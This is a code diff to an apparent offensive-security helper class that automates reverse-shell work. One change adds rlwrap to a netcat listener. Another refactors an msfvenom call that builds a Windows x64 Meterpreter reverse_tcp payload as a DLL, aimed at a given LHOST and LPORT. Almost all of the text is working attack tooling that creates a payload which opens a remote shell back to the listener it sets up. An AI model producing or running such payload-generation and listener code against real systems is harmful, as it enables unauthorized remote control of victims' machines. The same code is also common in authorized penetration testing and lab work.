@@ -39,7 +39,7 @@ class ToolService:
             use_sudo = "sudo"
 
         cmd_result = self.utils.run_command_output_loop(f'nc listening...', [
-            [use_sudo, 'nc', '-lvnp', str(port)],
+            [use_sudo, 'rlwrap', 'nc', '-lvnp', str(port)],
             ['tee', f'{path}/nc.log']
         ])
 
@@ -59,12 +59,12 @@ class ToolService:
         # reverse_end = 'dll'
 
         reverse_type = "windows/x64/meterpreter/reverse_tcp"
-        reverse_options = ['-ax64', '-f', 'dll']
-        reverse_end = 'dll'
+        reverse_format = 'dll'
+        reverse_options = ['-ax64', '-f', reverse_format]
 
         cmd_result = self.utils.run_command_output_loop(f'nc listening...', [
-            ['msfvenom', '-p', reverse_type, f'LHOST={host}', f'LPORT={port}', '-o', f'{path}/reverse_shell.{reverse_end}'] + reverse_options
+            ['msfvenom', '-p', reverse_type, f'LHOST={host}', f'LPORT={port}', '-o', f'{path}/reverse_shell.{reverse_format}'] + reverse_options
         ])
 
-        # with open(f'{path}/reverse_shell.{reverse_end}', 'r') as file:
+        # with open(f'{path}/reverse_shell.{reverse_format}', 'r') as file:
         #     file.write(cmd_result)
